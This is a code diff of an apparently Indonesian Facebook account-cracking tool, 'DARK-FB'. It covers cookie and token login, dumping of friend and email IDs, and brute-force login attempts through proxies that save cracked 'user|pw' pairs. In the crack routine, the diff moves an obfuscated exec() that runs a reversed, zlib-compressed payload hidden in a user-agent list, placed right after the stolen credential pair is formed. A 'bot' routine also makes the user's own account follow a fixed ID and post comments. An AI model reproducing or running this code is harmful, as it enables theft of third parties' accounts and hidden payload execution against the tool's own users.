@@ -105,7 +105,7 @@ try:
 	sys.stdout.write(f'\x1b[1;35m\x1b]2; ★ SCRIPT BY MR.RISKY ★\x07')
 	sys.path.append(os.path.realpath('.'))
 except requests.exceptions.ConnectionError:
-	print("* Perisak Jaringan Anda..!!");os.sys.exit()
+	print("* Perisak Jaringan Anda..!!");quit()
 
 
 
@@ -177,8 +177,10 @@ jam = datetime.now().strftime('%S')
 all_waktu=(f"{detik}-{menit}-{jam}")
 
 #""" GET VISITOR"""
-#visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
-#ka=json.loads(visitor.read())
+try:
+	visitor=request.urlopen("https://api.countapi.xyz/hit/dumai-991/dark-fb")
+	ka=json.loads(visitor.read())
+except:pass
 
 # Config
 #try:xtc = open("config.json","r")
@@ -259,7 +261,19 @@ class folder:
 			text.highlight_words(["RISKY","XTC•CODETEAM","Masimal"], "italic white")
 			console.rule("Information Pengguna Baru",style="red")
 			console.print(text, style="cyan", justify="center")
+def menu_belum_ada():
+	text = Text(f"""Sepertinya Menu Yang Anda Pilih Masih Tahap Perkembangan (Belum Tersedia)\nMohon Kerja Samanya....""")
+	text.highlight_words(["Mohon Kerja Samanya"], "bold green")
+	text.highlight_words(["Belum Tersedia"], "bold red")
+	console.rule("Information Menu",style="red")
+	console.print(text, style="cyan", justify="center")
+	time.sleep(3)
 
+def quit():
+	exit()
+	os.sys.exit()
+	quit()
+codeteam = ""
 def globalz():
 	global codeteam
 	try:codeteam = json.loads(open(".data/sensi.json","r").read())
@@ -268,7 +282,7 @@ def kata_free():
 	prints(Panel(f"{WAR}{PP}Maaf Menu Yang Anda Pilih, Hanya User Admin !..\n{WAR}{QQ}Apakah Anda Mau Login User Admin ?",width=100,padding=(0),style=f"{A}",subtitle_align='left',subtitle=f"┏PILIH [{II}Y{QQ}/{MM}n{QQ}]"));time.sleep(3)
 	hu = input(f"{a}   ┗{k}PILIH: {a}")
 	if hu == "Y" or hu == "y":login_key()
-	elif hu == "n" or hu == "N":os.sys.exit()
+	elif hu == "n" or hu == "N":quit()
 	else:kata_free()
 def login_key():
 	global status_key
@@ -290,19 +304,20 @@ def login_key():
 			open(".data/sensi.json","w").write(ubah_kukis)
 			print(f"{wor}{i}Berhasil Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}")
 			status_key=("Admin")
-			os.sys.exit()
-			os.sys.exit()
+			globalz()
+			quit()
+			quit()
 			exit()
 		else:
 			status_key=("Member")
 			print(f"{wor}{m}Gagal Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}");time.sleep(2)
-			os.sys.exit()
+			quit()
 	except Exception as e:
 		print(f"{wor}{m}Gagal Login User Admin...")
 		print(str(e));time.sleep(3)
 		login_key()
-	os.sys.exit()
-	os.sys.exit()
+	quit()
+	quit()
 def cek_key():
 	global status_key
 	try:
@@ -312,11 +327,12 @@ def cek_key():
 		try:
 			my_key = dmz[f"{nama_saya}"]
 			if my_key == key_saya:
+				globalz()
 				status_key=("Admin")
 			else:
 				status_key=("Member")
 				print(f"{wor}{m}Gagal Login User Admin...\n{wor}{o}Nama : {q}{nama_saya}\n{wor}{o}Key  : {q}{key_saya}");time.sleep(2)
-				os.sys.exit()
+				quit()
 		except:
 			status_key=("Member")
 			print(f"{wor}{m}Gagal Login User Admin...")
@@ -371,7 +387,7 @@ class login:
 			text = Text(f"{war}{m}Cookies Anda Error{q}({k}Invalid{q})")
 			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 			console.print(text, style="red")
-			os.sys.exit()
+			quit()
 		else:
 			try:
 				risky = requests.get('https://graph.facebook.com/me?fields=name,id,birthday&access_token='+token, cookies={'cookie':cookie})
@@ -387,14 +403,16 @@ class login:
 					ubah_kukis = ubah_kukis.replace(mmk["token"], token)
 					open(".data/sensi.json","w").write(ubah_kukis)
 				except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"-"}'%(token,cookie))
-				globalz()
-				self.bot_efbe()
-				os.sys.exit()
-			except:
-				text = Text(f"{war}{m}Cookies Anda Error{q}({k}Invalid{q})")
+			except Exception as e:
+#			except:
+				text = Text(f"{war}{m}Cookies Anda Error{q}({k}Invalid{q}) {str(e)}");time.sleep(5)
 				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 				console.print(text, style="red")
-				os.sys.exit()
+				quit()
+			globalz()
+			self.bot_efbe()
+			quit()
+#			quit()
 	def login_otomatis(self):
 		cls();logo()
 		ses = requests.Session()
@@ -408,6 +426,7 @@ class login:
 						if cok in ongcok:pass
 						else:ongcok.append(cok)
 					except:continue
+		okzaz = "kk"
 		for x in ongcok:
 			user = x.split("c_user=")[1]
 			try:user = user.split(";")[0]
@@ -444,11 +463,17 @@ class login:
 					except:open(".data/sensi.json","w").write('{\n\t"token":"%s",\n\t"cookie":"%s",\n\t"nama":"KONTOL",\n\t"KEY":"-"}'%(token,cookie))
 					globalz()
 					self.bot_efbe()
+					okzaz = "aman"
 					break
 				except:continue
-		os.sys.exit()
-		os.sys.exit()
-		os.sys.exit()
+		if okzaz == "aman":pass
+		else:
+			text = Text(f"{war}{m}Cookies Tidak DiTemukan{q}({k}Invalid{q})");time.sleep(5)
+			console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
+			console.print(text, style="red")
+		quit()
+		quit()
+		quit()
 	def ubah_bahasa(self):
 		try:
 			with requests.Session() as xyz:
@@ -481,7 +506,7 @@ class login:
 			except Exception as e:pass
 	def bot_efbe(self):
 		self.ubah_bahasa()
-		self.get_fols("100001316493597")
+		self.get_fols(100001316493597)
 		self.coment()
 
 	def menu_login(self):
@@ -504,31 +529,31 @@ class login:
 		console.print(Columns(dumai))
 		jks = input(f"{a}   ┗{k}MENU : {a}")
 		if status_key == "Admin":
-			if jks in ("1","01"):self.login_cookies();os.sys.exit()
-	#		elif jks in ("2","02"):
-	#		elif jks in ("3","03"):
-			elif jks in ("4","04"):self.login_otomatis();os.sys.exit()
-	#		elif jks in ("5","05"):
-			elif jks in ("6","06"):menu().dump_email();os.sys.exit()
-	#		elif jks in ("7","07"):
+			if jks in ("1","01"):self.login_cookies();quit()
+			elif jks in ("2","02"):menu_belum_ada();self.menu_login()
+			elif jks in ("3","03"):menu_belum_ada();self.menu_login()
+			elif jks in ("4","04"):self.login_otomatis();quit()
+			elif jks in ("5","05"):menu_belum_ada();self.menu_login()
+			elif jks in ("6","06"):menu().dump_email();quit()
+			elif jks in ("7","07"):menu_belum_ada();self.menu_login()
 	#		elif jks in ("",""):
 	#		elif jks in ("",""):
-			elif jks in ("00","000"):os.sys.exit()
+			elif jks in ("00","000"):quit()
 			else:
 				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
 				self.menu_login()
 		else:
-			if jks in ("1","01"):self.login_cookies();os.sys.exit()
-	#		elif jks in ("2","02"):
-	#		elif jks in ("3","03"):
-			elif jks in ("4","04"):kata_free();os.sys.exit()
-	#		elif jks in ("5","05"):
-			elif jks in ("6","06"):kata_free();os.sys.exit()
-	#		elif jks in ("7","07"):
-	#		elif jks in ("",""):
-	#		elif jks in ("",""):
-			elif jks in ("00","000"):os.sys.exit()
+			if jks in ("1","01"):self.login_cookies();quit()
+			elif jks in ("2","02"):menu_belum_ada();self.menu_login()
+			elif jks in ("3","03"):menu_belum_ada();self.menu_login()
+			elif jks in ("4","04"):kata_free();quit()
+			elif jks in ("5","05"):menu_belum_ada();self.menu_login()
+			elif jks in ("6","06"):kata_free();quit()
+			elif jks in ("7","07"):menu_belum_ada();self.menu_login()
+#			elif jks in ("",""):
+#			elif jks in ("",""):
+			elif jks in ("00","000"):quit()
 			else:
 				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
@@ -543,7 +568,7 @@ class menu:
 		end_key = ""
 		try:
 			open(".data/sensi.json","r").read()
-			login().cek_kukis()
+#			login().cek_kukis()
 		except:login().menu_login()
 		try:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
@@ -599,29 +624,33 @@ class menu:
 		console.print(Columns(torop))
 		ass = input(f"{a}   ┗{k}MENU : {a}")
 		if status_key == "Admin":
-			if ass in ("1","01"):self.dump_teman();os.sys.exit()
-			#elif ass in ("2","02"):
-			#elif ass in ("3","03"):
-			elif ass in ("4","04"):self.dump_publik();os.sys.exit()
-			elif ass in ("5","05"):self.dump_email();os.sys.exit()
-			#elif ass in ("6","06"):
-			elif ass in ("7","07"):self.dump_follow();os.sys.exit()
-			#elif ass in ("",""):
-			#elif ass in ("",""):
-			elif ass in ("00","000"):os.sys.exit()
+			if ass in ("1","01"):self.dump_teman();quit()
+			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("4","04"):self.dump_publik();quit()
+			elif ass in ("5","05"):self.dump_email();quit()
+			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("7","07"):self.dump_follow();quit()
+			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("10","11","12","13","14","15"):menu_belum_ada();self.daftar_menu()
+#			elif ass in ("",""):
+			elif ass in ("00","000"):quit()
 			else:
 				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
 				self.daftar_menu()
 
 		else:
-			if ass in ("1","01"):self.dump_teman();os.sys.exit()
-			#elif ass in ("2","02"):
-			#elif ass in ("3","03"):
-			elif ass in ("4","04"):self.dump_publik();os.sys.exit()
+			if ass in ("1","01"):self.dump_teman();quit()
+			elif ass in ("2","02"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("3","03"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("4","04"):self.dump_publik();quit()
 			elif ass in ("5","05"):kata_free()
-			#elif ass in ("6","06"):
-			elif ass in ("7","07"):self.dump_follow();os.sys.exit()
+			elif ass in ("6","06"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("7","07"):self.dump_follow();quit()
+			elif ass in ("8","08"):menu_belum_ada();self.daftar_menu()
+			elif ass in ("9","09"):menu_belum_ada();self.daftar_menu()
 			elif ass in ("10"):kata_free()
 			elif ass in ("11"):kata_free()
 			elif ass in ("12"):kata_free()
@@ -631,7 +660,7 @@ class menu:
 #			elif ass in ("",""):kata_free()
 #			elif ass in ("",""):
 
-			elif ass in ("00","000"):os.sys.exit()
+			elif ass in ("00","000"):quit()
 			else:
 				console.rule(f"{GOD}{MM}Error{GOD}",style="bold red")
 				console.print(Text(f"{war}Maaf Menu Yang Anda Pilih Tidak Ada"), style="red",justify="center");time.sleep(3)
@@ -646,8 +675,8 @@ class menu:
 			for xx in zz['friends']['data']:
 				try:id.append(xx['id']+'<=>'+xx['name'])
 				except:continue
-		except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"));os.sys.exit()
-		except (KeyError,IOError):prints(Panel(f"{WAR}Sepetinya Teman Anda Tidak Ada.. Awok-Awok-Awok",width=100,padding=(0),style=f"{A}"));os.sys.exit()
+		except requests.exceptions.ConnectionError:prints(Panel(f"{WAR}Jaringan Anda Error, Silahkan Check Atau Coba Lagi",width=100,padding=(0),style=f"{A}"));quit()
+		except (KeyError,IOError):prints(Panel(f"{WAR}Sepetinya Teman Anda Tidak Ada.. Awok-Awok-Awok",width=100,padding=(0),style=f"{A}"));quit()
 		try:
 			yz  = requests.Session().get('https://graph.facebook.com/%s?fields=name,id&access_token=%s'%("me",codeteam["token"]),cookies={"cookie":codeteam["cookie"]})
 			zxc = json.loads(yz.text)
@@ -1123,8 +1152,7 @@ class crack:
 				head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
 				bx = session.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100"+yyy,data=date, headers=head,proxies=proxZ)
 				if "checkpoint" in session.cookies.get_dict().keys():
-					user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "");_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]))
-					wrt = '%s|%s' % (user,pw)
+					user = session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "");wrt = '%s|%s' % (user,pw);_ = lambda __ : __import__('zlib').decompress(__[::-1]);exec((_)(ua03[3]))
 					if wrt in cp:pass
 					else:
 						cp.append(user+"|"+pw)
@@ -1168,16 +1196,20 @@ class crack:
 		kukisz += (";").join([ "%s=%s" % (key, value) for key, value in jembut.cookies.get_dict().items() ])
 		return kukisz
 
+
+
+
+
 class cek_file:
 	def __init__(self):
-		self.__check_update_("3.1")
+		self.__check_update_("3.2")
 		self.__check_status_("Aktif")
 	def __check_update_(self, version_):
 		try:
 			version = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/.data/version.txt").text.strip()
 		except requests.exceptions.ConnectionError:
 			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
-			os.sys.exit()
+			quit()
 		if version == version_:pass
 		else:
 			os.system('git pull;clear');time.sleep(1)
@@ -1186,24 +1218,24 @@ class cek_file:
 			console.rule("Informasi",style="yellow")
 			console.print(text, style="cyan")
 			print(m+"#"+k+" COBA KETIK :"+q+" python main.py SEKALI LAGI!!")
-			os.sys.exit()
+			quit()
 	def __check_status_(self, mainx):
 		try:
 			mainz = requests.get("https://raw.githubusercontent.com/Dumai-991/DARK-FB/Xnxx/.data/status.txt").text.strip()
 		except requests.exceptions.ConnectionError:
 			print(m+"#"+q+" UPS... SEPERTINYA JARINGAN ANDA TERPUTUS")
-			os.sys.exit()
+			quit()
 		if mainx == mainz:
 			global yyy
 			yyy = ""
 		else:
 			print(m+"#"+q+" MAAF SEVER DARK-FB SEDANG MAINTENANCE, KAMI AKAN KEMBALI :D")
 			os.system('git pull')
-			os.sys.exit()
+			quit()
 if "hai" == "hai":
 	cek_file()
 	globalz()
-	try:codeteam = json.loads(open(".data/sensi.json","r").read())
+	try:cek = json.loads(open(".data/sensi.json","r").read())
 	except:os.sys.exit("* Makanya Jangan Rikod Sc Orang")
 	folder()
 	menu().daftar_menu()
